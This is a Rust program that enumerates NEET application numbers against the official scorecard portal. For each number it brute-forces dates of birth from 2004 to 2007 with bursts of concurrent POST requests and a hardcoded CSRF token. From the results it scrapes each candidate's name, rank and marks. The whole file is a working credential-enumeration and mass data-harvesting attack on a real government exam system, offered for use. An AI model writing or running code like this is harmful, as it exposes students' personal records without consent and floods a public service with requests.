use reqwest::Client;
use scraper::{Html, Selector};
use std::error::Error;
use std::time::Duration;
use tokio;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    solve_all_applications().await?;
    Ok(())
}

async fn solve(
    application_number: &str,
    day: &str,
    month: &str,
    year: &str,
    client: &Client,
) -> Option<ParsedData> {
    let data = [
        ("_csrf-frontend", "B87_gsVSET-A0bjKlY4cSyJbzJVuPZOdlkyBn48B_YRUvsvWpmJlS7GB6Jza5kV4e2qp2gNI6tjxeequuHvMzQ=="),
        ("Scorecardmodel[ApplicationNumber]", application_number),
        ("Scorecardmodel[Day]", day),
        ("Scorecardmodel[Month]", month),
        ("Scorecardmodel[Year]", year),
    ];

    let response = client
        .post("https://neet.ntaonline.in/frontend/web/scorecard/index")
        .form(&data)
        .send()
        .await;

    match response {
        Ok(res) => {
            if let Ok(body) = res.text().await {
                parse_html(&body)
            } else {
                None
            }
        }
        Err(_) => None,
    }
}

fn parse_html(html_content: &str) -> Option<ParsedData> {
    let document = Html::parse_document(html_content);

    let selector_td = Selector::parse("td").unwrap();

    let mut application_number = "N/A".to_string();
    let mut candidate_name = "N/A".to_string();
    let mut all_india_rank = "N/A".to_string();
    let mut marks = "N/A".to_string();

    for element in document.select(&selector_td) {
        let text = element.text().collect::<Vec<_>>().join("").trim().to_string();
        if text.contains("Application No.") {
            if let Some(next) = element.next_sibling().and_then(|n| n.value().as_text()) {
                application_number = next.to_string();
            }
        } else if text.contains("Candidate’s Name") {
            if let Some(next) = element.next_sibling().and_then(|n| n.value().as_text()) {
                candidate_name = next.to_string();
            }
        } else if text.contains("NEET All India Rank") {
            if let Some(next) = element.next_sibling().and_then(|n| n.value().as_text()) {
                all_india_rank = next.to_string();
            }
        } else if text.contains("Total Marks Obtained (out of 720)") {
            if let Some(next) = element.next_sibling().and_then(|n| n.value().as_text()) {
                marks = next.to_string();
            }
        }
    }

    if all_india_rank == "N/A" {
        return None;
    }

    Some(ParsedData {
        application_number,
        candidate_name,
        all_india_rank,
        marks,
    })
}

async fn main_loop(roll_number: &str, client: &Client) -> Result<(), Box<dyn Error>> {
    let mut solved = false;
    for year in (2004..=2007).rev() {
        if solved {
            break;
        }
        for month in 1..=12 {
            if solved {
                break;
            }

            println!("Sending requests for month {} of year {}", month, year);

            let mut data_promises = Vec::new();

            for day in 1..=31 {
                let client = client.clone();
                data_promises.push(solve(roll_number, &day.to_string(), &month.to_string(), &year.to_string(), &client));
            }

            let resolved_data = futures::future::join_all(data_promises).await;

            for data in resolved_data {
                if let Some(parsed_data) = data {
                    println!("{:?}", parsed_data);
                    solved = true;
                    break;
                }
            }
        }
    }

    Ok(())
}

async fn solve_all_applications() -> Result<(), Box<dyn Error>> {
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .build()?;

    for i in 240411345673..240411999999 {
        main_loop(&i.to_string(), &client).await?;
    }

    Ok(())
}

#[derive(Debug)]
struct ParsedData {
    application_number: String,
    candidate_name: String,
    all_india_rank: String,
    marks: String,
}
